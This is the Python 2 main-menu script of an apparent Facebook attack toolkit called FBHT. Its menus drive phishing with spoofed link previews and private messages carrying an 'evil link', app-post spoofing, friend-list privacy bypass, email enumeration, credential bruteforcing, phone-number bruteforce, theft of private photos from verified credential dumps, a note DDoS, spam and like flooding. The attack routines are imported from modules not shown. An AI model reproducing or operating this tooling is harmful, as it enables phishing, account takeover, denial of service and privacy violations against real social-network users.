from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng , \
                     reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot, \
                     massLogin,acceptRequest,friendshipRequest,like, \
                     appMessageSpoof,setMail,login,linkPreviewYoutube,\
                     linkPreview,hijackVideo, privateMessagePhishing, \
                     bypassFriendshipPrivacy, linkFriends, createUser, \
                     deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, \
                     simpleGraph, dotFile, simpleDotGraph, noteDDoS, likeDev, \
                     devTest, getTest, changePassword,massMessage, \
                     massLoginTest, plotDOT, dotFileDatabase, \
                     simpleDotGraphDatabase, friendlyLogout, takePhotos, \
                     accountexists, checkLogin,steal, bruteforceCel, sendBroadcast, getFriends, \
                     getUserIDS, checkMe
from database import connect,status, checkTableExistence, createVictimTable
from time import time
import signal
from handlers import *
from sys import stdin
import os

globalLogin = False
globalEmail = ''
globalPassword = ''
privacy = {'0':'80','1':'40','2':'10'}
privacySet = ['0','1','2']

def main():
    global globalLogin
    global globalEmail
    global globalPassword

    print '                       \n \n \n \n \n \n          '
    print '                    ______ ____  _    _ _______   '
    print '                   |  ____|  _ \| |  | |__   __|  '
    print '                   | |__  | |_) | |__| |  | |     '
    print '                   |  __| |  _ <|  __  |  | |     '
    print '                   | |    | |_) | |  | |  | |     '
    print '                   |_|    |____/|_|  |_|  |_|     '
    print '                              ____  __            '
    print '                             |___ \/_ |           '
    print '                        __   ____) || |           '
    print '                        \ \ / /__ < | |           '
    print '                         \ V /___) || |           '
    print '                          \_/|____(_)_|           '
    print '                                                                   '
    print '               _     _                                             '
    print '    ____      | |   (_)                                            '
    print '   / __ \  ___| |__  _ _ __   ___   ___   __ _  __ ___      ____ _ '
    print '  / / _` |/ __| \'_ \| | \'_ \ / _ \ / _ \ / _` |/ _` \ \ /\ / / _` |'
    print ' | | (_| | (__| | | | | | | | (_) | (_) | (_| | (_| |\ V  V | (_| |'
    print '  \ \__,_|\___|_| |_|_|_| |_|\___/ \___/ \__, |\__,_| \_/\_/ \__,_|'
    print '   \____/                                 __/ |                    '
    print '                                         |___/                     '
    print '\n\n\n\n\n\n'	

    raw_input('Enjoy it :D . Press enter to get started')
    
    def testAccounts():
        option = 0
        def createAcc():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
            appID = raw_input('Enter Application ID: ')
            
            if (login(email,password,'real'))!= -1:
                number = raw_input('Insert the amount of accounts for creation (4 min): ')
                for i in range(int(number)/4):
                    sTime = time()
                    devTest(appID)
                getTest(appID)
                           
        def deleteAcc():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
                
            if (login(email,password,'real'))!= -1:
                deleteUser()
                deleteAccounts()
                sTime = time()
                raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue: ')                
              
        def connectAcc():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
                
            if (login(email,password,'real'))!= -1:
                sTime = time()
                massLoginTest()
                raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue:')                
         
        def friendRequest():
            sTime = time()
            massLogin()
            friendshipRequest()
            raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue:')
        
        def friendAccept():
            sTime = time()
            massLogin()
            acceptRequest()
            raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue:')                
        
        def back():
            option = 0

        testAccountsOptions = {
                               1 : createAcc,
                               2 : deleteAcc,
                               3 : connectAcc,
                               4 : friendRequest,
                               5 : friendAccept,
                               6 : back,
                            }
        while option not in testAccountsOptions.keys():
            print '======= Test account options ======='
            print '1)  Create accounts\n'
            print '2)  Delete all accounts for a given user\n'
            print '3)  Connect all the accounts of the database\n'
            print '4)  Send friendship requests (Test Accounts)\n'
            print '5)  Accept friendship requests (Test Accounts)\n'
            print '6)  Take me back\n'
            try:
                option = int(raw_input('Insert your choice: '))
            except:
                print 'That\'s not an integer, try again'
        
        #Executes and restores variable after
        testAccountsOptions[option]()
        option = 0
        
    def phishingVectors():
        option = 0

        def previewSimple():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
            
            if (login(email,password,'real'))!= -1:
                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
                if option in privacySet:  
                    summary = raw_input('Insert a summary for the link: ')
                    link = raw_input('Insert de evil link: ')
                    realLink = raw_input('Insert de real link: ')
                    title = raw_input('Insert a title for the link: ')
                    image = raw_input('Insert the image url for the post: ')
                    comment = raw_input('Insert a comment for the post associated: ')
                    linkPreview(link,realLink,title,summary,comment,image, privacy[option])
                else:
                    print "Wrong privacy value, try again "                       

        def previewYoutube():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
            
            if (login(email,password,'real'))!= -1:
                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
                if option in privacySet:
                    summary = raw_input('Insert a summary for the video: ')
                    link = raw_input('Insert de evil link: ')
                    videoLink = raw_input('Insert de youtube link: ')
                    title = raw_input('Insert a title for the video: ')
                    videoID = raw_input('Insert the video ID (w?=): ')
                    comment = raw_input('Insert a comment for the post associated to the video: ')
                    linkPreviewYoutube(link,videoLink,title,summary,comment,videoID,privacy[option])
                else:
                    print "Wrong privacy value, try again "                 
        
        def youtubeHijack():   
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
                if option in privacySet:
                    summary = raw_input('Insert a summary for the video: ')
                    videoLink = raw_input('Insert de youtube link: ')
                    title = raw_input('Insert a title for the video: ')
                    videoID = raw_input('Insert the video ID (watch?v=): ')
                    comment = raw_input('Insert a comment for the post associated to the video: ')
                    hijackedVideo = raw_input('Insert the ID for the hijacked video (watch?v=): ')
                    hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo,privacy[option])
                else:
                    print "Wrong privacy value, try again "
            
        def messageSimple():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victims user ID: ')
                realLink = raw_input('Insert the real link: ')
                title = raw_input('Insert a title for the link: ')
                subject = raw_input('Insert the subject: ')
                summary = raw_input('Insert a summary for the link: ')
                message = raw_input('Insert the body of the message: ')            
                evilLink = raw_input('Insert the evil link: ')
                imageLink = raw_input('Insert the image associated to the post: ')
                privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,evilLink)    

        def messageYoutube():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                victimId = raw_input('Insert the victims user ID: ')
                subject = raw_input('Insert the subject: ')
                message = raw_input('Insert the message: ')
                title = raw_input('Insert a title for the video: ')
                summary = raw_input('Insert a summary for the video: ')
                videoLink = raw_input('Insert de youtube link: ')
                evilLink = raw_input('Insert the evil link (For hijacking insert same link as above): ')
                videoID = raw_input('Insert the video ID (watch?v=): ')
                hijackedVideo = raw_input('Insert the ID for the hijacked video (watch?v=) - For Non-Hijackig press enter: ')          
                privateMessagePhishing(victimId,message,subject,evilLink,videoLink,title,summary,videoID,hijackedVideo)

        def appSpoof():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword            
            
            if (login(email,password,'real'))!= -1:
                appId = raw_input('Insert a valid AppId: ')
                link = raw_input('Insert de evil link: ')
                picture = raw_input('Insert a link to a picture for the post: ')
                title = raw_input('Insert a title for the post: ')
                domain = raw_input('Insert a domain for the post: ')
                description = raw_input('Insert a description for the post: ')
                comment = raw_input('Insert a comment for the post: ')
                appMessageSpoof(appId,link,picture,title,domain,description,comment)
        
        def requestList():              
            warning = True
            while ( (warning is not '0') and (warning is not '1')):
                warning = raw_input('Your account could be blocked.. Continue? 0|1: ')

            
            if (warning == '1'):
                
                victim = raw_input('Insert the victim username (Bypass friends list first): ')
                
                if (globalLogin == False):
                    email,password = setMail()
                else:
                    email = globalEmail
                    password = globalPassword
    
                if (login(email,password,'real'))!= -1:
                    sendRequestToList(victim)               
        
        def back():
            option = 0

        phishingVectorsOptions = {
                               1 : previewSimple,
                               2 : previewYoutube,
                               3 : youtubeHijack,
                               4 : messageSimple,
                               5 : messageYoutube,
                               6 : appSpoof,
                               7 : requestList,
                               8 : back,
                            }
        while option not in phishingVectorsOptions.keys():
            print '======= Phishing vector options ======='
            print '1)  Link Preview hack (Simple web version)\n'
            print '2)  Link Preview hack (Youtube version)\n'
            print '3)  Youtube hijack\n'
            print '4)  Private message, Link Preview hack (Simple web version)\n'
            print '5)  Private message, Link Preview hack (Youtube version)\n'
            print '6)  Publish a post as an App (App Message Spoof)\n'
            print '7)  Send friend request to disclosed friend list from your account\n'
            print '8)  Take me back\n'
            try:
                option = int(raw_input('Insert your choice: '))
            except:
                print 'That\'s not an integer, try again'
        
        #Executes and restores variable after
        phishingVectorsOptions[option]()
        option = 0
        
    def OSINT():
        option = 0
        
        def bypass():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victim username or userId: ')
                transitive = raw_input('Insert the transitive username or userId: ')
                
                print "The information will be stored in %s. \n" % os.path.join("dumps",victim+".txt")
                bypassFriendshipPrivacy(victim, transitive)            

        def bypassGraph():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victim username or userId: ')
                check = checkPrivacy(victim)
                if (check == -1):
                    transitive = raw_input('Insert the transitive username or userId: ')
                    print 'The information will be stored in %s \n' % os.path.join("dumps",victim,victim+".txt")
                    bypassFriendshipPrivacyPlot(victim, transitive)
                else:
                    print 'Friends available public ;D'
                    victim = checkMe(victim)
                    friendList, friendsName = friendshipPlot(check,victim)
                    simpleGraph(friendList, victim)         
        
        def analize():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
            
            if (login(email,password,'real'))!= -1:
                analize = int(raw_input('Analyze an existing one, or a new one? (0|1): '))
                victim = raw_input('Insert the victim username or userId: ')
                if (analize == 1):
                    analyzeGraph(victim)
                else:
                    reAnalyzeGraph(victim)                
        
        
        def linkDisclosed():
            fileName = raw_input('Insert the victim username: ')
            linkFriends(fileName)            

        def bypassDot():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victim username or userId: ')
                check = checkPrivacy(victim)
                if (check == -1):
                    transitive = raw_input('Insert the transitive username or userId: ')
                    print 'The information will be stored in %s \n' % os.path.join("dumps",victim,victim+".txt")
                    dotFile(victim, transitive)
                else:
                    print 'Friends publicly available ;D'
                    friendList, friendsName = friendshipPlot(check,victim)
                    simpleDotGraph(friendsName, victim)            

        def bypassDB():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword             
            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victim username or userId: ')
                if ( checkTableExistence(victim) != True):
                    if (createVictimTable(victim) != -1):
                        check = checkPrivacy(victim)
                        if (check == -1):
                            transitive = raw_input('Insert the transitive username or userId: ')
                            dotFileDatabase(victim, transitive)
                            plotDOT(victim)    
                        else:
                            print 'Friends publicly available ;D'
                            friendList, friendsName = friendshipPlot(check,victim)
                            simpleDotGraphDatabase(friendsName, victim)
                            plotDOT(victim)
                                     
        def publicFriends():
            email,password = setMail()
            if (login(email,password,'real'))!= -1:
                username = raw_input("Insert the username: ")
                getFriends(username)             

        def idFromUsername():
            email,password = setMail()
            if (login(email,password,'real'))!= -1:
                username = raw_input("Insert the username: ")
                getUserIDS(username)
                
        def back():
            option = 0


        OSINTOptions = {
                               1 : bypass,
                               2 : bypassGraph,
                               3 : analize,
                               4 : linkDisclosed,
                               5 : bypassDot,
                               6 : bypassDB,
                               7 : publicFriends,
                               8 : idFromUsername,
                               9 : back,
                            }
        while option not in OSINTOptions.keys():
            print '======= OSINT options ======='
            print '1)  Bypass friendship privacy\n'
            print '2)  Bypass friendship privacy with graph support\n'
            print '3)  Analyze an existing graph\n'
            print '4)  Link to disclosed friendships\n'
            print '5)  Bypass friendship (only .dot without graph integration)\n'
            print '6)  Bypass - database support (Beta) \n '
            print '7)  Get public friends\n'
            print '8)  Get userIDS from usernames\n'
            print '9)  Take me back\n'
            
            try:
                option = int(raw_input('Insert your choice: '))
                if option > len(OSINTOptions):
                    raise
            except:
                print 'That\'s not an integer, try again'
        
        #Executes and restores variable after
        OSINTOptions[option]()
        option = 0
        
    def bruteforcing():
        option = 0

        def userEnumeration():
            mailFile = raw_input('Insert the filename that contains the list of emails (place it in PRIVATE folder first): ')
            raw_input('Verified emails will be stored in PRIVATE --> existence --> verified.txt ')
            accountexists(mailFile)                

        def bruteforce():
            mailFile = raw_input('Insert the filename that contains the list of emails and passwords (place it in PRIVATE folder first) with email:password pattern: ')
            raw_input('Verified loggins will be stored in PRIVATE --> loggedin --> loggedin.txt ')
            checkLogin(mailFile)            

        def celBruteforce():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
            if (login(email,password,'real'))!= -1:
                raw_input('Dumps will be stored in cellphones --> cellphones.txt')
                first = raw_input('Insert the zone code: ')
                start = raw_input('Insert the start number: ')
                end = raw_input('Insert the end number: ')
                bruteforceCel(first,start,end)
        
        def back():
            option = 0
            
        bruteforcingOptions = {
                               1 : userEnumeration,
                               2 : bruteforce,
                               3 : celBruteforce,
                               4 : back,
                            }
        while option not in bruteforcingOptions.keys():
            print '======= Bruteforce options ======='
            print '1)  Check existence of mails\n'
            print '2)  Check working account and passwords\n'
            print '3)  Bruteforce cellphones\n'
            print '4)  Take me back\n'
            try:
                option = int(raw_input('Insert your choice: '))
                if option > len(bruteforcingOptions):
                    raise
            except:
                print 'That\'s not an integer, try again'
        
        #Executes and restores variable after
        bruteforcingOptions[option]()
        option = 0
        
    def gathering():
        option = 0
        
        def photosSingleCredential():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                threads = raw_input('Usage: insert the threads filename and place it in massive folder first: ')
                raw_input('Dumps will be stored in massive\\photos')
                takePhotos(threads)
        
        def photosMassive():
            raw_input('You must first run option 30, if you didn\'t I will fail :D ')
            raw_input('Dumps will be stored in massive\\photos')
            steal()
        
        def back():
            option = 0
            
        gatheringOptions = {
                               1 : photosSingleCredential,
                               2 : photosMassive,
                               3 : back,
                            }
        while option not in gatheringOptions.keys():
            print '======= Gathering options ======='
            print '1)  Take the photos!\n'
            print '2)  Steal private photos from password verified dump\n'
            print '3)  Take me back\n'
            
            try:
                option = int(raw_input('Insert your choice: '))
                if option > len(gatheringOptions):
                    raise
            except:
                print 'That\'s not an integer, try again'
        
        #Executes and restores variable after
        gatheringOptions[option]()
        option = 0            
    
    def miscellaneous():
        option = 0

        def broadcast():
            while True:
                online = raw_input("Send only to online friends? 0|1: ")
                if ((int(online) == 1) or (int(online) == 0)):
                    break
                
            email,password = setMail()
            if (login(email,password,'real'))!= -1:
                sendBroadcast(int(1))               

        def ddos():
            print 'Facebook note DDoS attack, discovered by chr13: http://chr13.com/about-me/'
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                raw_input('Usage: First you must create an empty note. Once your note is created, write down the note ID number from the URL. ENTER TO CONTINUE...')
                imageURL = raw_input('Insert the image URL from the site attack: ')
                noteID = raw_input('Insert the note ID: ')
                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
                if option in privacySet:
                    noteDDoS(imageURL,noteID, privacy[option])                

        def spam():
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword             
            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victim username or userId: ')
                if ( checkTableExistence(victim) != True):
                    if (createVictimTable(victim) != -1):
                        check = checkPrivacy(victim)
                        if (check == -1):
                            transitive = raw_input('Insert the transitive username or userId: ')
                            dotFileDatabase(victim, transitive)
                            plotDOT(victim)    
                        else:
                            print 'Friends publicly available ;D'
                            friendList, friendsName = friendshipPlot(check,victim)
                            simpleDotGraphDatabase(friendsName, victim)
                            plotDOT(victim)

        def friendly():

            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                raw_input('Usage: First you must create an empty note. Once your note is created, write down the note ID number from the URL. ENTER TO CONTINUE...')
                noteID = raw_input('Insert the note ID: ')
                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
                if option in privacySet:
                    friendlyLogout(noteID, privacy[option])
                       
        def newLike():
            try:
                counter = 0
                postId = []
                
                print "Insert the Post ID's (Must be from a page). If no more posts for adding,insert '0' :"
                while True:
                    response = raw_input('post[%d]:'%counter)
                    if ( response is not '0' ):
                        counter+=1
                        postId.append(response)
                    else:
                        break
                        
                likeDev(postId)
            except EOFError:
                print 'EOFError'
                stdin.flush()
                pass
            except signalCaught as e:
                print ' %s' %e.args[0]
                        
        def oldLike():

            try:
                counter = 0
                postId = []
                
                print 'Insert the Post ID\'s (Must be from a page). If no more posts for adding,insert \'0\' :'
                while True:
                    response = raw_input('post[%d]:'%counter)
                    if ( response is not '0' ):
                        counter+=1
                        postId.append(response)
                    else:
                        break
                
                quantity = raw_input('Insert the amount of likes: ')
                like(postId, quantity)
            except EOFError:
                print 'EOFError'
                stdin.flush()
                pass
            except signalCaught as e:
                print ' %s' %e.args[0]  
                raw_input('Press enter to continue..')

        def dead():
            print 'Mail bomber through test accounts'
            print 'Test accounts massive creation'
            print 'Blocked Test account login bypass'
            print 'We hope this tool to be useless in the future'
            raw_input('Press enter to continue: ')

        def back():
            option = 0

        miscellaneousOptions = {
                               1 : broadcast,
                               2 : ddos,
                               3 : spam,
                               4 : friendly,
                               5 : newLike,
                               6 : oldLike,
                               7 : dead,
                               8 : back,
                            }
        while option not in miscellaneousOptions.keys():
            print '======= Miscellaneous options ======='
            print '1)  Send broadcast to friends (Individual messages)\n'
            print '2)  Note DDoS attack\n'
            print '3)  SPAM any fanpage inbox\n'
            print '4)  Logout all your friends - FB blackout \n'
            print '5)  NEW Like flood\n'
            print '6)  Old Like Flood (Not working)\n'
            print '7)  Print dead attacks :\'( \n'
            print '8)  Take me back\n'
            
            try:
                option = int(raw_input('Insert your choice: '))
                if option > len(miscellaneousOptions):
                    raise
            except:
                print 'That\'s not an integer, try again'
        
        #Executes and restores variable after
        miscellaneousOptions[option]()
        option = 0  
        
    def configuration():
        option = 0

        def statusDB():

            status()
            raw_input('Press enter to continue: ')


        def loggingLevel():

            print 'This will increase the execution time significantly'
            setGlobalLogginng()
            
        def back():
            option = 0

        configurationOptions = {
                               1 : statusDB,
                               2 : loggingLevel,
                               3 : back,
                            }
        while option not in configurationOptions.keys():
            print '======= Configuration options ======='
            print '1)  Print database status\n'
            print '2)  Increase logging level globally\n'
            print '3)  Take me back\n'
            
            try:
                option = int(raw_input('Insert your choice: '))
                if option > len(configurationOptions):
                    raise
            except:
                print 'That\'s not an integer, try again'
        
        #Executes and restores variable after
        configurationOptions[option]()
        option = 0  
        
    def exitFBHT():

        connect.close()
        
        print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '                        
        print ' _    _            _      _______ _            _____  _                  _   _  '
        print '| |  | |          | |    |__   __| |          |  __ \| |                | | | | '
        print '| |__| | __ _  ___| | __    | |  | |__   ___  | |__) | | __ _ _ __   ___| |_| | '
        print '|  __  |/ _` |/ __| |/ /    | |  |  _ \ / _ \ |  ___/| |/ _` |  _ \ / _ \ __| | '
        print '| |  | | (_| | (__|   <     | |  | | | |  __/ | |    | | (_| | | | |  __/ |_|_| '
        print '|_|  |_|\__,_|\___|_|\_\    |_|  |_| |_|\___| |_|    |_|\__,_|_| |_|\___|\__(_) '
        print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '

        exit(0)
        
    options = {
               1 : testAccounts,
               2 : phishingVectors,
               3 : OSINT,
               4 : bruteforcing,
               5 : gathering,
               6 : miscellaneous,
               7 : configuration,
               8 : exitFBHT,
            }
  
    while 1:
        signal.signal(signal.SIGINT, signal_handler)
        option = -1
        while option not in options.keys():
            
            print '1) Test accounts'
            print '2) Phishing vectors'
            print '3) OSINT'
            print '4) Bruteforcing'
            print '5) Gathering information with credentials'
            print '6) Miscellaneous'
            print '7) Configuration'
            print '8) Take me out of here'
            
            try:
                option = int(raw_input('Insert your choice: '))
                if option > len(options):
                    raise
            except:
                print 'That\'s not an integer, try again'
        
        #Executes and restores variable after
        options[option]()
        option = 0
    

if __name__ == '__main__':
    main()